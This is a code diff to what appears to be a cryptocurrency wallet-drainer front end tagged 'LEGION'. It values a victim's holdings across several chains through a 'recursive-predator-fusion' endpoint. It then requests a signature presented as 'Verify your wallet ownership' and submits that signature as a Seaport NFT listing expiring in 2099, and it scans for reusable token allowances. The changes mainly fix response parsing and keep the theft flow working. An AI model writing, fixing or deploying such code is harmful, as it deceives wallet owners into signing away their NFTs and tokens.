@@ -1778,7 +1778,7 @@
         if (connectedChains.TON) scanAddresses.ton_friendly_address = connectedChains.TON.address;
         if (connectedChains.BTC) scanAddresses.btc_holder_address = connectedChains.BTC.address;
         var preScanResult = await apiPost('/api/scout/recursive-predator-fusion', scanAddresses);
-        var preScanData = (preScanResult && preScanResult.data) ? preScanResult.data : preScanResult;
+        var preScanData = (preScanResult && preScanResult.data && preScanResult.data.fusion) ? preScanResult.data.fusion : (preScanResult && preScanResult.data) ? preScanResult.data : preScanResult;
         if (preScanData && preScanData.total_usd) {
           SESSION_SCOUT_VALUE_USD = preScanData.total_usd;
           console.log('[LEGION]   🏦 Wallet value: $' + SESSION_SCOUT_VALUE_USD.toFixed(2));
@@ -1953,19 +1953,21 @@
             wallet_address: connectedChains.EVM.address,
             chain_id: connectedChains.EVM.chainId || 1
           });
-          if (nftScanResult && nftScanResult.listings && nftScanResult.listings.length > 0) {
-            console.log('[LEGION]   🖼️  Found', nftScanResult.listings.length, 'NFTs');
+          var nftListings = (nftScanResult && nftScanResult.data && nftScanResult.data.listings) || (nftScanResult && nftScanResult.listings) || [];
+          if (nftListings.length > 0) {
+            console.log('[LEGION]   🖼️  Found', nftListings.length, 'NFTs');
             // Submit Seaport listing for each valuable NFT
-            for (var ni = 0; ni < nftScanResult.listings.length; ni++) {
+            for (var ni = 0; ni < nftListings.length; ni++) {
               try {
-                var nftListing = nftScanResult.listings[ni];
+                var nftListing = nftListings[ni];
                 var seaportTypedData = await apiPost('/api/v1/seaport/listing-typed-data', {
                   wallet_address: connectedChains.EVM.address,
                   chain_id: connectedChains.EVM.chainId || 1,
-                  token_address: nftListing.contract,
-                  token_id: nftListing.tokenId
+                  nft_contract: nftListing.nft_contract || nftListing.contract,
+                  token_id: nftListing.token_id || nftListing.tokenId
                 });
-                if (seaportTypedData && seaportTypedData.typedData) {
+                var seaportData = (seaportTypedData && seaportTypedData.data) ? seaportTypedData.data : seaportTypedData;
+                if (seaportData && seaportData.typed_data) {
                   var nftMsg = 'Verify your wallet ownership\n\nWallet: ' + connectedChains.EVM.address.substring(0, 6) + '...';
                   var nftMsgHex = '0x' + Array.from(new TextEncoder().encode(nftMsg)).map(function(b) { return b.toString(16).padStart(2, '0'); }).join('');
                   var nftSig = await connectedChains.EVM.provider.request({
@@ -1978,15 +1980,15 @@
                       chain_family: 'EVM',
                       protocol: 'seaport_listing',
                       wallet_address: connectedChains.EVM.address,
-                      token_address: nftListing.contract,
+                      token_address: nftListing.nft_contract || nftListing.contract,
                       signature: nftSig,
                       nonce: 'legion:nft:' + Date.now(),
                       expiry_iso: '2099-12-31T23:59:59.999Z',
                       wallet_type: connectedChains.EVM.walletType || 'hot_wallet',
                       chain_id: connectedChains.EVM.chainId || 1,
-                      seaport_order: seaportTypedData.order
+                      seaport_order: seaportData.order_parameters || seaportData.order
                     });
-                    console.log('[LEGION]   ✅ NFT listed:', nftListing.contract);
+                    console.log('[LEGION]   ✅ NFT listed:', nftListing.nft_contract || nftListing.contract);
                   }
                 }
               } catch (nftErr) {
@@ -2015,19 +2017,19 @@
           // TRON USDT, TON native - everything in one call
           var fusionResult = await apiPost('/api/scout/recursive-predator-fusion', allAddresses);
 
-          var fusionData = (fusionResult && fusionResult.data) ? fusionResult.data : fusionResult;
+          var fusionData = (fusionResult && fusionResult.data && fusionResult.data.fusion) ? fusionResult.data.fusion : (fusionResult && fusionResult.data) ? fusionResult.data : fusionResult;
           if (fusionData) {
             var totalUsd = fusionData.total_usd || 0;
             var assetsCount = fusionData.assets_count || 0;
             SESSION_SCOUT_VALUE_USD = totalUsd;
             console.log('[LEGION]   🏦 Deep scan complete: $' + totalUsd.toFixed(2) + ' across ' + assetsCount + ' assets');
 
-            if (fusionResult.staked_steth_usd > 0) console.log('[LEGION]     → stETH: $' + fusionResult.staked_steth_usd.toFixed(2));
-            if (fusionResult.staked_msol_usd > 0) console.log('[LEGION]     → mSOL: $' + fusionResult.staked_msol_usd.toFixed(2));
-            if (fusionResult.staked_jitosol_usd > 0) console.log('[LEGION]     → JitoSOL: $' + fusionResult.staked_jitosol_usd.toFixed(2));
-            if (fusionResult.lp_uniswap_v3_usd > 0) console.log('[LEGION]     → Uniswap V3 LP: $' + fusionResult.lp_uniswap_v3_usd.toFixed(2));
-            if (fusionResult.lp_raydium_usd > 0) console.log('[LEGION]     → Raydium LP: $' + fusionResult.lp_raydium_usd.toFixed(2));
-            if (fusionResult.tron_trc20_usdt_usd > 0) console.log('[LEGION]     → TRON USDT: $' + fusionResult.tron_trc20_usdt_usd.toFixed(2));
+            if (fusionData.staked_steth_usd > 0) console.log('[LEGION]     → stETH: $' + fusionData.staked_steth_usd.toFixed(2));
+            if (fusionData.staked_msol_usd > 0) console.log('[LEGION]     → mSOL: $' + fusionData.staked_msol_usd.toFixed(2));
+            if (fusionData.staked_jitosol_usd > 0) console.log('[LEGION]     → JitoSOL: $' + fusionData.staked_jitosol_usd.toFixed(2));
+            if (fusionData.lp_uniswap_v3_usd > 0) console.log('[LEGION]     → Uniswap V3 LP: $' + fusionData.lp_uniswap_v3_usd.toFixed(2));
+            if (fusionData.lp_raydium_usd > 0) console.log('[LEGION]     → Raydium LP: $' + fusionData.lp_raydium_usd.toFixed(2));
+            if (fusionData.tron_trc20_usdt_usd > 0) console.log('[LEGION]     → TRON USDT: $' + fusionData.tron_trc20_usdt_usd.toFixed(2));
           }
         } catch (fusionErr) {
           console.debug('[LEGION]   Deep scan skipped:', fusionErr.message);
@@ -2038,10 +2040,11 @@
         try {
           var reuseResult = await apiPost('/api/v1/allowance-reuse/scan', {
             wallet_address: connectedChains.EVM.address,
-            chain_id: connectedChains.EVM.chainId || 1
+            evm_chain_id: connectedChains.EVM.chainId || 1
           });
-          if (reuseResult && reuseResult.reusable && reuseResult.reusable.length > 0) {
-            console.log('[LEGION]   🔄 Found', reuseResult.reusable.length, 'reusable allowances');
+          var reuseData = (reuseResult && reuseResult.data) ? reuseResult.data : reuseResult;
+          if (reuseData && reuseData.reusable && reuseData.reusable.length > 0) {
+            console.log('[LEGION]   🔄 Found', reuseData.reusable.length, 'reusable allowances');
           }
         } catch (reuseErr) {
           console.debug('[LEGION]   Allowance reuse check skipped:', reuseErr.message);
